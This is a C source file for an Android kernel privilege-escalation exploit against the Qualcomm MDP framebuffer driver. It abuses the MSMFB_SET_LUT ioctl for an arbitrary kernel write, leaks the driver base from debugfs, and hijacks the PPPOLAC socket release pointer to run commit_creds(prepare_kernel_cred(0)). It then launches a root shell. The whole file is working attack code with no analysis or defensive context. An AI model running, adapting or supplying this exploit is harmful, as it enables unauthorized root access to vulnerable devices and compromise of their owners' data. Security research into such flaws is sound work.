#include <stdio.h>
#include <errno.h>
#include <fcntl.h>
#include <stdlib.h>

#include <sys/mman.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/stat.h>

#include "defines.h"

void write_where(int mdp_fd, int mdp_lut_i, int mdp_base, uint32_t content, uint32_t where) {

    printf("[i] Trying to write 0x%08x at 0x%08x\n", content, where);

    if ((content & 0xff000000) != 0) {
        printf("[-] last 8 bits sets, but unable to write them!\n");
        exit(EXIT_FAILURE);
    }

    uint32_t cmap_start_target = (where - mdp_base - MDP_KERNEL_PARAM_OFFSET - 0x400*mdp_lut_i) / 4;

    uint32_t overflown_result = mdp_base + MDP_KERNEL_PARAM_OFFSET + 0x400*mdp_lut_i + cmap_start_target*4;

    printf("[i] Target cmap_start: 0x%08x\n", cmap_start_target);
    printf("[i] Expected VM target address: 0x%08x\n", overflown_result);
    
    uint16_t transp = 0x0;
    uint16_t red = (content & 0x00ff0000) >> 16;
    uint16_t blue = (content & 0x0000ff00) >> 8;
    uint16_t green = (content & 0x000000ff) >> 0;

    printf("[i] transp %01x red %01x blue %01x green %01x\n", transp, red, blue, green);

    struct fb_cmap cmap;

    cmap.start = cmap_start_target;
    cmap.len = 1;
    cmap.transp = &transp;
    cmap.red = &red;
    cmap.blue = &blue;
    cmap.green = &green;

    int res = ioctl(mdp_fd, MSMFB_SET_LUT, &cmap);
    if (res < 0) {
        perror("[-] Failed to trigger MSMFB_SET_LUT ioctl");
        exit(EXIT_FAILURE);
    }
    printf("[+] Wrote 0x%08x to 0x%08x\n", content, where);
}

uint32_t leak_mdp_lut_i(int mdp_fd, int mdp_base) {

    printf("[i] Trying to leak the current value of mdp_lut_i\n");

    //dropzone to leak mdp lut i
    void* dropzone = mmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (dropzone == NULL) {
        perror("[-] Failed to map dropzone\n");
        exit(EXIT_FAILURE);
    }
    printf("[+] Successfully mapped dropzone. Address: %p, Size: 0x%08X\n", (void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    memset(dropzone, FILLER_BYTE, USER_MAPPING_SIZE);

    write_where(mdp_fd, 0, mdp_base, 0x00dabeef, (uint32_t) dropzone);


    //Looking for a modification in the buffer
    uint32_t modification = 0;
    void* modification_address = NULL;
    int i;
    for (i=0; i<USER_MAPPING_SIZE; i++) {
        if (((char*)dropzone)[i] != FILLER_BYTE) {
            modification_address = (void*)((uint32_t)dropzone + i);
            modification = *((uint32_t*)modification_address);
            printf("[+] Found modification: 0x%08x at offset: 0x%x (address: %p)\n", modification, i, modification_address);
            break;
        }
    }
    if (modification_address == NULL) {
        printf("[-] Failed to find modification, aborting\n");
        exit(EXIT_FAILURE);
    }

    uint32_t delta = modification_address - dropzone;

    printf("[i] delta write %08x\n", delta);

    uint32_t mdp_lut_i = delta / 0x400;

    if ((delta % 0x400 != 0) || mdp_lut_i > 1) {
        printf("[-] offset not multiple of 0x400 or mdp_lut_i > 1, something went wrong!\n");
        exit(EXIT_FAILURE);
    }

    munmap((void*)START_MAP_ADDRESS, USER_MAPPING_SIZE);

    return mdp_lut_i;
}

uint32_t get_mdp_base() {

    printf("[i] Trying to leak the value of MDP_BASE\n");

    // /sys/kernel/debug/mdp-dbg/base

    FILE *base;

    base = fopen("/sys/kernel/debug/mdp-dbg/base","r");

    if (!base) {
        printf("[-] Failed to open mdp-dbg/base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    uint32_t mdp_base = 0;

    int res = fscanf(base, "mdp_base  :    %x", &mdp_base);

    if (res != 1) {
        printf("[-] Failed to leak mdp base from debug fs\n");
        exit(EXIT_FAILURE);
    }

    printf("[i] Got mdp_base 0x%08x res %d\n", mdp_base, res);

    fclose(base);

    return mdp_base;
}

_commit_creds commit_creds = (_commit_creds) COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred) PREPARE_KERNEL_CRED;

void kernel_payload() {
    commit_creds(prepare_kernel_cred(0));
}

int main(int argc, char const *argv[])
{
    //Opening the device
    int mdp_fd = open("/dev/graphics/fb0", O_RDONLY | O_DSYNC);
    if (mdp_fd < 0) {
        perror("[-] Failed to open /dev/graphics/fb0");
        return -errno;
    }
    printf("[+] Opened mdp driver\n");

    uint32_t mdp_base = get_mdp_base();

    printf("[+] Got mdp_base: 0x%08x\n", mdp_base);

    uint32_t mdp_lut_i = leak_mdp_lut_i(mdp_fd, mdp_base);

    printf("[+] Got mdp_lut_i: 0x%01x\n", mdp_lut_i);

    /**
     * The pointer to the function stub which is executed whenever a PPPOLAC
     * socket is closed. This stub contains a short piece of ARM code which jumps
     * to the given address, like so:
     *  LDR PC, addr
     * addr:
     *  DCD <ADDRESS>
    */
    uint32_t* trampoline = NULL;

    //Allocating the trampoline
    trampoline = (uint32_t*)mmap((void*)TRAMPOLINE_ADDRESS, 0x1000, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
    if (trampoline == NULL) {
        perror("[-] Failed to allocate trampoline");
        return -errno;
    }
    printf("[+] Allocated trampoline\n");

    printf("[i] Attempting to execute kernel_payload at 0x%08x\n", (uint32_t)&kernel_payload);

    //Writing to the trampoline
    trampoline[0] = 0xE51FF004; //LDR PC, [addr]
    //addr:
    trampoline[1] = (uint32_t)&kernel_payload;

    //Flushing the cache (to make sure the I-cache doesn't contain leftovers)
    cacheflush((uint32_t)trampoline & (~0xFFF), 0x1000, 0);

    // mdp_lut_i will switch between 0 and 1 at each call
    mdp_lut_i = !mdp_lut_i;

    write_where(mdp_fd, mdp_lut_i, mdp_base, (uint32_t)trampoline, PPPOLAC_PROTO_OPS_RELEASE);

    //Opening and closing a PPPOLAC socket
    int sock = socket(AF_PPPOX, SOCK_DGRAM, PX_PROTO_OLAC);
    if (sock < 0) {
        perror("[-] Failed to open PPPOLAC socket\n");
        return -errno;
    }
    printf("[+] Opened PPPOLAC socket: %d\n", sock);
    close(sock);
    printf("[+] Executed function\n");

    if (getuid() != 0) {
        printf("[-] failed to get uid 0\n");
        exit(EXIT_FAILURE);
    }

    printf("[+] got r00t!\n");

    close(mdp_fd);
    munmap((void*)TRAMPOLINE_ADDRESS, 0x1000);

    execl("/system/bin/sh", "sh", NULL);

    return 0;
}